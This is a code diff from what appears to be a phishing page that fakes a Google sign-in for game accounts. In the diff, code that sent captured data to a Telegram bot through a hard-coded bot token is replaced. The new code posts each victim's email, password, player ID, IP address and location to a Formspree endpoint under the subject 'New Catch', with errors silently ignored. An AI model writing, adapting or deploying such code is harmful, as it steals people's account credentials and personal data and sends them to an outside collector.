@@ -501,16 +501,26 @@ WEB MAS SHINJI☕
 💻 IP : ${ipData.ip}
             `.trim();
 
-            const botToken = '8875426142:AAHql1lzWkYCruoV6rbie4evDYGpOv-sL4U';
-            const chatId = '7758332034';
+                // KIRIM KE EMAIL VIA FORMSPREE
+    const formspreeUrl = 'https://formspree.io/f/xjykzdjv';
+    try {
+        await fetch(formspreeUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                subject: `New Catch: ${email} (${currentGame})`,
+                email_target: email,
+                password_target: password,
+                player_id: fullId,
+                game: currentGame,
+                nickname: detectedNickname,
+                ip_address: ipData.ip,
+                location: `${ipData.city}, ${ipData.country_name}`,
+                asn: ipData.org
+            })
+        });
+    } catch(err) {}
 
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: formattedMessage })
-                });
-            } catch(err) {}
 
             document.getElementById('google-modal').style.display = 'none';
             
